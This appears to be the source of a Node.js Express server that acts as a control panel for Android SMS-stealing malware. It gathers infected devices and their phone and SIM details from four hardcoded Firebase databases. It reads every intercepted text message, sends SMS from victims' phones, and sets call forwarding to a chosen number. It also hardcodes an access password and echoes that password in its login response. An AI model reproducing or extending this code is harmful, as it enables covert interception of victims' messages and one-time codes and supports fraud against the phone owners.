const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
// Static files share karne ke liye (public folder)
app.use(express.static('public'));

// ========== CONFIGURATION & DATABASES ==========
const PASSWORD = 'Alexa';

const DATABASES = {
    'sanjee': 'https://sanjee-9918a-default-rtdb.firebaseio.com',
    'ruparamme': 'https://ruparamee-14f4b-default-rtdb.firebaseio.com',
    'rnd12': 'https://rnd12-17508-default-rtdb.firebaseio.com',
    'pawan': 'https://pawankumar92342038-8f702-default-rtdb.firebaseio.com'
};

// Helper function for Firebase
async function firebaseGet(url, path = '') {
    try {
        const fullUrl = `${url}/${path}.json`;
        const response = await fetch(fullUrl);
        if (!response.ok) return null;
        return await response.json();
    } catch (error) {
        return null;
    }
}

// ========== API ENDPOINT ==========
app.all('/api.php', async (req, res) => {
    const action = req.query.action || '';
    const pwd = req.query.pwd || '';

    // 1. LOGIN
    if (action === 'login') {
        const password = req.body.password || req.query.password || '';
        const ok = (password === PASSWORD);
        return res.json({
            ok: ok,
            debug: { post: req.body, get: req.query, password_received: password, expected: PASSWORD }
        });
    }

    // AUTH CHECK
    if (pwd !== PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized', pwd_received: pwd });
    }

    // 2. SYNC
    if (action === 'sync') {
        const allDevices = {};
        const index = {};

        for (const [dbKey, dbUrl] of Object.entries(DATABASES)) {
            const rootData = await firebaseGet(dbUrl, '');
            if (rootData && typeof rootData === 'object') {
                for (const [id, val] of Object.entries(rootData)) {
                    if (val && typeof val === 'object' && (val.status !== undefined || val.phoneNumber !== undefined)) {
                        allDevices[id] = {
                            id: id,
                            d_name: val.d_name || val.name || 'Device',
                            status: String(val.status || 'offline').toLowerCase(),
                            battery: val.battery || 0,
                            phoneNumber: val.phoneNumber || val.number || '',
                            numberSim1: val.numberSim1 || '',
                            numberSim2: val.numberSim2 || '',
                            sim1Name: val.nameSim1 || '',
                            db: dbKey
                        };
                        index[id] = dbKey;
                    }
                }
            }
        }
        return res.json({ ok: true, devices: allDevices, index: index, count: Object.keys(allDevices).length });
    }

    // 3. ALL SMS
    if (action === 'all_sms') {
        const dbFilter = req.query.db || '';
        const allSms = [];

        for (const [dbKey, dbUrl] of Object.entries(DATABASES)) {
            if (dbFilter && dbFilter !== dbKey) continue;
            const rootData = await firebaseGet(dbUrl, '');
            if (rootData && typeof rootData === 'object') {
                const smsKeys = ['sms', 'user_sms', 'messages', 'SMS'];
                for (const key of smsKeys) {
                    if (rootData[key] && typeof rootData[key] === 'object') {
                        for (const [deviceId, deviceSms] of Object.entries(rootData[key])) {
                            if (deviceSms && typeof deviceSms === 'object') {
                                for (const [smsId, sms] of Object.entries(deviceSms)) {
                                    if (sms && typeof sms === 'object' && sms.body !== undefined) {
                                        allSms.push({
                                            _dev: deviceId,
                                            _db: dbKey,
                                            body: sms.body || '',
                                            sender: sms.sender || 'Unknown',
                                            date: sms.date || sms.timestamp || Math.floor(Date.now() / 1000),
                                            timestamp: sms.timestamp || sms.date || Math.floor(Date.now() / 1000)
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        allSms.sort((a, b) => (Number(b.timestamp) || 0) - (Number(a.timestamp) || 0));
        return res.json(allSms);
    }

    // 4. SMS FOR DEVICE
    if (action === 'sms') {
        const deviceId = req.query.id || '';
        const dbKey = req.query.db || '';
        const result = [];

        if (deviceId && dbKey && DATABASES[dbKey]) {
            const rootData = await firebaseGet(DATABASES[dbKey], '');
            if (rootData && typeof rootData === 'object') {
                const smsKeys = ['sms', 'user_sms', 'messages', 'SMS'];
                for (const key of smsKeys) {
                    if (rootData[key] && rootData[key][deviceId] && typeof rootData[key][deviceId] === 'object') {
                        for (const [smsId, sms] of Object.entries(rootData[key][deviceId])) {
                            if (sms && typeof sms === 'object' && sms.body !== undefined) {
                                result.push({
                                    body: sms.body || '',
                                    sender: sms.sender || 'Unknown',
                                    date: sms.date || sms.timestamp || Math.floor(Date.now() / 1000),
                                    timestamp: sms.timestamp || sms.date || Math.floor(Date.now() / 1000)
                                });
                            }
                        }
                    }
                }
            }
        }
        result.sort((a, b) => (Number(b.timestamp) || 0) - (Number(a.timestamp) || 0));
        return res.json(result);
    }

    // 5. SEND SMS
    if (action === 'send_sms') {
        const deviceId = req.body.id || req.query.id || '';
        const dbKey = req.body.db || req.query.db || '';
        const to = req.body.to || req.query.to || '';
        const body = req.body.body || req.query.body || '';

        if (!deviceId || !dbKey || !DATABASES[dbKey] || !to || !body) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        try {
            const dbUrl = DATABASES[dbKey];
            const payload = { to, message: body, timestamp: Math.floor(Date.now() / 1000), status: 'pending' };
            const response = await fetch(`${dbUrl}/sendSMS/${deviceId}.json`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const resultData = await response.json();
            return res.json({ ok: true, message: 'SMS sent', result: resultData });
        } catch (error) {
            return res.status(500).json({ error: 'Firebase error' });
        }
    }

    // 6. CALL FORWARDING
    if (action === 'call_fwd') {
        const deviceId = req.body.id || req.query.id || '';
        const dbKey = req.body.db || req.query.db || '';
        const phone = req.body.phone || req.query.phone || '';
        const status = req.body.status || req.query.status || '';

        if (!deviceId || !dbKey || !DATABASES[dbKey] || !phone) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        try {
            const dbUrl = DATABASES[dbKey];
            const payload = { phone, status, timestamp: Math.floor(Date.now() / 1000) };
            const response = await fetch(`${dbUrl}/callForwarding/${deviceId}.json`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const resultData = await response.json();
            return res.json({ ok: true, message: `Call forwarding ${status}`, result: resultData });
        } catch (error) {
            return res.status(500).json({ error: 'Firebase error' });
        }
    }

    // 7. DEVICE DETAILS
    if (action === 'device') {
        const deviceId = req.query.id || '';
        const dbKey = req.query.db || '';
        if (deviceId && dbKey && DATABASES[dbKey]) {
            const rootData = await firebaseGet(DATABASES[dbKey], '');
            if (rootData && rootData[deviceId]) {
                return res.json(rootData[deviceId]);
            }
        }
        return res.json(null);
    }

    return res.status(404).json({ error: 'Unknown action' });
});

// Server boot
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
